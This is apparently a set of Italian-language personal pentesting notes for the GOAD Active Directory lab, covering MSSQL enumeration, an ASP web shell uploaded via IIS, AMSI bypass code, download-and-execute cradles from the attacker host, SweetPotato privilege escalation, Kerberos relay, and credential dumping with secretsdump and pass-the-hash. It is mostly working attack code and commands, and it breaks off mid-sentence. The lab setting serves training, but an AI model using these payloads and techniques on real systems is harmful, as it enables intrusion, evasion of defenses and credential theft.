### **ENUM MSSQL**
Vediamo quali server hanno MSSQL attivo
```bash
nmap -p 1433 -sV -sC 192.168.56.10-23
```
![[Pasted image 20230830110346.png]]
![[Pasted image 20230830110835.png]]
Controlliamo se ci sono utenti con SPN sui server MSSQL trovati
```bash
impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
![[Pasted image 20230830104754.png]]
```bash
GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
![[Pasted image 20230830110943.png]]
è possibile anche usare crackmapexec per enumerare
```bash
crackmapexec mssql 192.168.56.22-23
```
![[Pasted image 20230830151845.png]]

### **MSSQL PWN**
Non funziona
### **IIS Rev Shell**
All'indirizzo http://192.168.56.22/Default.aspx c'è un web server IIS che consente un upload.
Carichiamo quindi una web shell in .asp.
```aspx
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
            <FORM action="" method="POST">
                <input type="text" name="param" size=45 value="<%= myValue %>">
                <input type="submit" value="Run">
            </FORM>
            <p>
        Result :
        <% 
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
        <br>
    </BODY>
</HTML>
```
![[Pasted image 20230906101505.png]]
Ora abbiamo ottenuto una reverse shell
![[Pasted image 20230906104623.png]]

### **IIS Priv Esc**
*AMSI Bypass*
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
[amsi.fail](https://amsi.fail/)
Io ho usato una versione modificata di quelli trovabili in questi due link
```PowerShell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```
Di seguito uno script per disabilitare totalmente AMSI a livello .NET
```PowerShell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
Apriamo un server http e lanciamolo sulla macchina windows
```PowerShell
(new-object system.net.webclient).downloadstring('http://192.168.56.6:8080/amsi_rmouse.txt')|IEX
```
![[Pasted image 20230906110016.png]]
==ORA NON TOCCARE PIù IL DISCO ALTRIMENTI MANDI TUTTO A DONNINE==
Per runnare gli script runnali direttamente in memoria quando li scarichi
*WinPeas senza toccare il disco*
Per approfondimento
[Running a .NET Assembly in Memory with Meterpreter - (praetorian.com)](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter/)

Prendi WinPeas e lancialo in memoria
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
```
```powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```
![[Pasted image 20230906111136.png]]
*SeImpersonatePrivilege to Authority\system*
Qui si possono usare svariate tecniche "Potato". Per approfondimenti
[https://jlajara.gitlab.io/Potatoes_Windows_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

Useremo ora [SeeetPotato](https://github.com/CCob/SweetPotato)
Che compileremo con visual studio e caricheremo sulla vittima
Caricheremo inoltre un file runme.bat che verrà eseguito da SweerPotato per ottenere una RevShell come amministratore
```PowerShell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','c:\temp\runme.bat')
```
```PowerShell
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe'); 
```
```PowerShell
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
```
```PowerShell
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter [Console]::SetOut($sWriter); 
```
```PowerShell
[SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'));[Console]::SetOut($out);$sWriter.ToString()
```
![[Pasted image 20230906122310.png]]
### **KRLBRELAY UP**
https://github.com/tyranid/oleviewdotnet/releases/download/v1.11/Release.7z
[cube0x0/KrbRelay: Framework for Kerberos relaying (github.com)](https://github.com/cube0x0/KrbRelay)
Per utilizzare questo metodo LDAP non deve essere enforced, verificabile con CrackMapExec
```bash
crackmapexec ldap 192.168.56.10-12 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M ldap-signing
```
![[Pasted image 20230906123355.png]]
Quindi aggiungiamo un nuovo computer al domain
```bash
impacket-addcomputer -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```
![[Pasted image 20230906123509.png]]

Ora prendiamo il SID del nuovo Computer
```PowerShell
$o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local").objectSID
```
```PowerShell
(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
```
![[Pasted image 20230906125241.png]]
Ora carichiamo CheckPort.exe sulla macchine ed eseguiamolo
```Powershell
.\CheckPort.exe
```
![[Pasted image 20230906142820.png]]
Usiamo il modulo di OleViewDotNet per trovare il clsid
Usa la guida presente sul github di KrbRelay (Sono andato a tentativi, nel mio caso ho usato altri nella lista forniti dal github)
Lanciamo KrbRelay.exe
```powershell
.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 9acf41ed-d457-4cc1-941b-ab02c26e4686 -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
```
![[Pasted image 20230906150422.png]]
==Continua a dare errore, potrebbe essere colpa di azure, da riprovare con il lab a casa==
Ora usiamo Impacket per ottenere un TGT e poi un ST per l'account da amministratore
```bash
impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPassword'
export KRB5CCNAME=./krbrelay\$.ccache   
```
```bash
impacket-getST -impersonate 'administrator' -spn 'CIFS/castelblack.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$'
```

### **Lateral Movement**
Prima di saltare da una macchina all'altra è essenziale ottenere tutti i "Secrets" della macchina pwnata.
```bash
impacket-secretsdump NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
```
![[Pasted image 20230906162707.png]]
Per quanto riguarda il SAM i risultato sono mostrati cosi:
```
<Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:
```
Questo valore sulle LM hash significa vuoto ==aad3b435b51404eeaad3b435b51404ee==

*Pass the Hash*
Spesso nel creare i network gli amministratori copiano le macchine, quindi le password vengono riutilizzate.
Per testare ciò si può usare crackmapexec
```bash
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
```
![[Pasted image 20230906164347.png]]
Quando una macchina viene promossa a DC, la password dell'amministratore locale diventa la password del domain administrator
```bash
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'
```
![[Pasted image 20230906164901.png]]
*LSA secrets and Cached domain logon information*
dumpiamo HKLM\\SECURITY e HKLM\\SYSTEM
```bash
impacket-smbserver -smb2support share .
impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.6\share'
impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.6\share'
```
![[Pasted image 20230906165710.png]]
E dumpa i "secrets"
```bash
impacket-secretsdump -security SECURITY.save -system SYSTEM.save LOCAL
```
![[Pasted image 20230906170139.png]]
Ci da molte informazioni come:
- Cached domain credentials (DCC2 hashcat mode 2100) (Quasi impossibili da craccare)
- Machine account : example here : $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:22d57aa0196b9e885130414dc88d1a95
- Service account credentials
- DPAPI key e password per l'autologon
Ora si potrebbero effettuare più mosse, come lanciare bloodhound con il machine account trovato, usare le credenziali del service account o provare a craccare le hash DCC2
*LSASS*
Un altro importante contenitore di "Secrets" è il processo lsass.exe
Potresti usare mimkatz ma ora useremo .
